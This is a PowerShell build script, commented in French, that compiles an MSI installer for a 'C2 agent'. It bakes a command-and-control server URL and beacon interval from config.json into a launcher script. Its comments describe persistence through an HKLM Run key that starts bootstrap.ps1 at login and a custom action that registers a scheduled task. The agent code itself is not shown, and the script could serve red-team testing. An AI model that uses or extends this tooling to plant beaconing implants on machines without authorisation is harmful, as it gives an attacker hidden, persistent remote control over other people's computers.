#Requires -Version 5.0

<#
.SYNOPSIS
    Script de compilation du MSI pour l'agent C2

.DESCRIPTION
    Ce script :
    1. Vérifie que WiX Toolset est installé
    2. Compile le fichier C2Agent.wxs en C2Agent.wixobj
    3. Linke les fichiers pour créer C2Agent.msi

.PARAMETER WixPath
    Chemin vers le répertoire d'installation de WiX (auto-détection si non spécifié)

.PARAMETER OutputDir
    Répertoire de sortie pour le MSI (par défaut: répertoire courant)

.EXAMPLE
    .\build-msi.ps1
    .\build-msi.ps1 -WixPath "C:\Program Files (x86)\WiX Toolset v3.11\bin"
#>

param(
    [string]$WixPath,
    [string]$OutputDir = $PSScriptRoot
)

$ErrorActionPreference = "Stop"

function Write-Log {
    param(
        [string]$Message,
        [string]$Level = "INFO"
    )
    
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "[$timestamp] [$Level] $Message"
    
    $color = switch ($Level) {
        "ERROR" { "Red" }
        "SUCCESS" { "Green" }
        "WARNING" { "Yellow" }
        default { "White" }
    }
    
    Write-Host $logEntry -ForegroundColor $color
}

Write-Host ""
Write-Host "========================================================" -ForegroundColor Cyan
Write-Host "        WiX MSI Builder - C2 Agent" -ForegroundColor Cyan
Write-Host "========================================================" -ForegroundColor Cyan
Write-Host ""

# Détecter le compilateur MSI wixl (paquet wixl / msitools) — compile sur Linux.
# La tâche planifiée n'est PAS créée par une custom action (wixl ne les exécute
# pas) : le MSI pose une entrée HKLM\...\Run qui lance bootstrap.ps1 au 1er login.
Write-Log "Recherche du compilateur MSI (wixl)..." "INFO"

$wixlCmd = Get-Command "wixl" -ErrorAction SilentlyContinue
if (-not $wixlCmd) {
    Write-Log "wixl introuvable. Installez le paquet 'wixl' (Debian 13) ou 'msitools' (Debian 12) : apt-get install -y wixl" "ERROR"
    exit 1
}
$wixlPath = $wixlCmd.Source
Write-Log "wixl trouvé: $wixlPath" "SUCCESS"

# Vérifier que les fichiers source existent
$wxsFile = Join-Path -Path $PSScriptRoot -ChildPath "C2Agent.wxs"
$configFile = Join-Path -Path $PSScriptRoot -ChildPath "config.json"
$launcherFile = Join-Path -Path $PSScriptRoot -ChildPath "launcher.ps1"
$agentFile = Join-Path -Path $PSScriptRoot -ChildPath "agent_active.ps1"

Write-Log "Vérification des fichiers source..." "INFO"

if (-not (Test-Path -Path $wxsFile)) {
    Write-Log "Fichier WiX non trouvé: $wxsFile" "ERROR"
    exit 1
}

if (-not (Test-Path -Path $configFile)) {
    Write-Log "Fichier config non trouvé: $configFile" "ERROR"
    exit 1
}

if (-not (Test-Path -Path $launcherFile)) {
    Write-Log "Fichier launcher non trouvé: $launcherFile" "ERROR"
    exit 1
}

if (-not (Test-Path -Path $agentFile)) {
    Write-Log "Fichier agent_active.ps1 non trouvé: $agentFile" "ERROR"
    exit 1
}

Write-Log "Fichiers source vérifiés avec succès" "SUCCESS"

# wixl est un binaire unique : pas de candle/light séparés à valider.

# ===== INJECTION DE CONFIGURATION =====

Write-Log "" "INFO"
Write-Log "Lecture de la configuration depuis config.json..." "INFO"

try {
    $config = Get-Content -Path $configFile -Raw | ConvertFrom-Json
    $serverUrl = $config.agent.serverUrl
    $beaconInterval = $config.agent.beaconInterval
    $logFile = $config.agent.logFile
    
    Write-Log "✅ Configuration chargée:" "SUCCESS"
    Write-Log "   Server URL: $serverUrl" "INFO"
    Write-Log "   Beacon Interval: $beaconInterval secondes" "INFO"
    Write-Log "   Log File: $logFile" "INFO"
}
catch {
    Write-Log "Erreur lors de la lecture de config.json: $_" "ERROR"
    exit 1
}

# Créer launcher.ps1 injecté avec les paramètres
Write-Log "" "INFO"
Write-Log "Injection des paramètres dans launcher.ps1..." "INFO"

$launcherContent = Get-Content -Path $launcherFile -Raw

# Remplacer les valeurs par défaut
$injectedLauncher = $launcherContent `
    -replace 'ConfigPath = "\$PSScriptRoot\\config\.json"', "ConfigPath = `"INJECTED`"" `
    -replace 'Expand-EnvironmentVariables \$config\.agent\.serverUrl', "`"$serverUrl`"" `
    -replace 'Expand-EnvironmentVariables \$config\.agent\.beaconInterval', "$beaconInterval" `
    -replace 'Expand-EnvironmentVariables \$config\.agent\.logFile', "`"$logFile`""

# Également remplacer directement les variables utilisées
$injectedLauncher = $injectedLauncher `
    -replace '\$serverUrl = \$config\.agent\.serverUrl', "`$serverUrl = `"$serverUrl`"" `
    -replace '\$beaconInterval = \$config\.agent\.beaconInterval', "`$beaconInterval = $beaconInterval" `
    -replace '\$logFilePath = Expand-EnvironmentVariables \$config\.agent\.logFile', "`$logFilePath = `"$([System.Environment]::ExpandEnvironmentVariables($logFile))`""

# Sauvegarder le launcher injecté temporairement
$injectedLauncherPath = Join-Path -Path $PSScriptRoot -ChildPath "launcher.ps1.injected"
Set-Content -Path $injectedLauncherPath -Value $injectedLauncher

Write-Log "✅ launcher.ps1 injecté créé" "SUCCESS"

# Modifier temporairement C2Agent.wxs pour pointer vers le launcher injecté et enlever config.json
Write-Log "" "INFO"
Write-Log "Modification temporaire de C2Agent.wxs..." "INFO"

$wxsContent = Get-Content -Path $wxsFile -Raw
$wxsBackup = $wxsContent

# Remplacer la référence launcher.ps1 par launcher.ps1.injected
$wxsModified = $wxsContent `
    -replace 'Source="launcher\.ps1"', 'Source="launcher.ps1.injected"'

# Enlever le composant config.json
$wxsModified = $wxsModified `
    -replace '(?s)<!-- Fichier de configuration -->.*?</Component>', '<!-- ConfigFile removed during build -->'

# Enlever la référence au ConfigFile dans Feature
$wxsModified = $wxsModified `
    -replace '<ComponentRef Id="ConfigFile" />', '<!-- ConfigFile reference removed -->'

# NB : la CustomAction (type exe) et l'InstallExecuteSequence sont conservees.
# wixl ne supportait pas l'ancienne CustomAction VBScript ; elle a ete remplacee
# dans C2Agent.wxs par une CustomAction exe qui lance register-task.ps1.

Set-Content -Path $wxsFile -Value $wxsModified

Write-Log "✅ C2Agent.wxs modifié temporairement" "SUCCESS"

# Créer le répertoire de sortie s'il n'existe pas
$wixobjFile = Join-Path -Path $OutputDir -ChildPath "C2Agent.wixobj"
$msiFile = Join-Path -Path $OutputDir -ChildPath "C2Agent.msi"

# Compilation MSI avec wixl (une seule étape : compilation + liaison)
Write-Log "" "INFO"
Write-Log "Compilation du MSI avec wixl..." "INFO"
Write-Log "Source: $wxsFile" "INFO"
Write-Log "Output: $msiFile" "INFO"

try {
    # 2>&1 : rediriger stderr de wixl vers le flux de sortie pour capturer ses messages d'erreur
    & $wixlPath -v -o $msiFile $wxsFile 2>&1 | ForEach-Object { Write-Host $_ }

    if ($LASTEXITCODE -ne 0) {
        Write-Log "Erreur de compilation wixl (exit code $LASTEXITCODE)" "ERROR"
        # Restaurer le .wxs et nettoyer avant de quitter
        if (Test-Path -Path $injectedLauncherPath) { Remove-Item -Path $injectedLauncherPath -Force }
        Set-Content -Path $wxsFile -Value $wxsBackup
        exit 1
    }

    Write-Log "Compilation MSI réussie" "SUCCESS"
}
catch {
    Write-Log "Erreur lors de la compilation wixl: $_" "ERROR"
    if (Test-Path -Path $injectedLauncherPath) { Remove-Item -Path $injectedLauncherPath -Force }
    Set-Content -Path $wxsFile -Value $wxsBackup
    exit 1
}

# Vérifier que le MSI a été créé
if (Test-Path -Path $msiFile) {
    $fileSize = (Get-Item -Path $msiFile).Length / 1MB
    Write-Log "" "INFO"
    Write-Log "✅ MSI créé avec succès!" "SUCCESS"
    Write-Log "Fichier: $msiFile" "INFO"
    Write-Log "Taille: $($fileSize.ToString('F2')) MB" "INFO"
    Write-Log "" "INFO"
    
    # Nettoyer les fichiers intermédiaires
    Write-Log "Nettoyage des fichiers temporaires..." "INFO"
    
    if (Test-Path -Path $wixobjFile) {
        Remove-Item -Path $wixobjFile -Force
        Write-Log "Fichier supprimé: $wixobjFile" "DEBUG"
    }
    
    if (Test-Path -Path $injectedLauncherPath) {
        Remove-Item -Path $injectedLauncherPath -Force
        Write-Log "Fichier supprimé: $injectedLauncherPath" "DEBUG"
    }
    
    # Restaurer C2Agent.wxs
    Set-Content -Path $wxsFile -Value $wxsBackup
    Write-Log "C2Agent.wxs restauré à son état original" "DEBUG"
    
    Write-Log "✅ Nettoyage terminé" "SUCCESS"
}
else {
    Write-Log "Erreur: Le fichier MSI n'a pas été créé" "ERROR"
    
    # Nettoyer même en cas d'erreur
    if (Test-Path -Path $injectedLauncherPath) {
        Remove-Item -Path $injectedLauncherPath -Force
    }
    Set-Content -Path $wxsFile -Value $wxsBackup
    
    exit 1
}
